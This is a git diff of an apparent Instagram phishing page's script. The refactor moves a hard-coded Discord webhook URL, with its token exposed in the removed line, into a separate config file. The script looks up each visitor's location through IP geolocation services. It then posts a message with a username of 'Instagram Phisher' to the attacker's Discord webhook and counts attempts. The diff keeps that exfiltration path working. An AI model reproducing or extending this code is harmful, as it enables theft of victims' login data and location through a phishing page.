@@ -69,17 +69,15 @@
     </div>
   </div>
 
-  <script>
-    // === DISCORD WEBHOOK CONFIG ===
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484291070106927104/rmZj_raRyYCQsZn4Fazz-hh0j6uuwrCDC18VMY-yOFtezFmEyt_7RkJuj9dZ8x5kwLDE";
+  <!-- Load config first, then main script -->
+  <script type="module">
+    import CONFIG from './config.js';
 
     let attempt = 0;
 
-    // Reliable IP Geolocation using ipapi.co (browser-friendly)
+    // Reliable IP Geolocation
     async function getLocation() {
       try {
-        console.log("Fetching location...");
-
         const res = await fetch('https://ipapi.co/json/', {
           method: 'GET',
           headers: { 'Accept': 'application/json' }
@@ -89,15 +87,13 @@
 
         const data = await res.json();
 
-        console.log("Location data received:", data); // ← Check this in browser console
-
         return {
           country: data.country_name || data.country || 'Unknown',
           state: data.region || data.region_code || 'Unknown'
         };
       } catch (err) {
         console.error("Geolocation failed:", err);
-        // Fallback attempt with another service if first fails
+        // Fallback
         try {
           const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
           const fbData = await fallback.json();
@@ -108,10 +104,9 @@
             };
           }
         } catch (fbErr) {
-          console.error("Fallback also failed:", fbErr);
+          console.error("Fallback failed:", fbErr);
         }
       }
-
       return { country: 'Unknown', state: 'Unknown' };
     }
 
@@ -145,9 +140,9 @@
 
 🔐 2025@FTECHSERVICES`;
 
-      // Send to Discord
+      // Send to Discord using config
       try {
-        await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -155,9 +150,9 @@
             username: "Instagram Phisher"
           })
         });
-        console.log("Data sent to Discord successfully");
+        console.log("✅ Data sent to Discord");
       } catch (err) {
-        console.error("Webhook failed:", err);
+        console.error("❌ Webhook failed:", err);
       }
 
       attempt++;
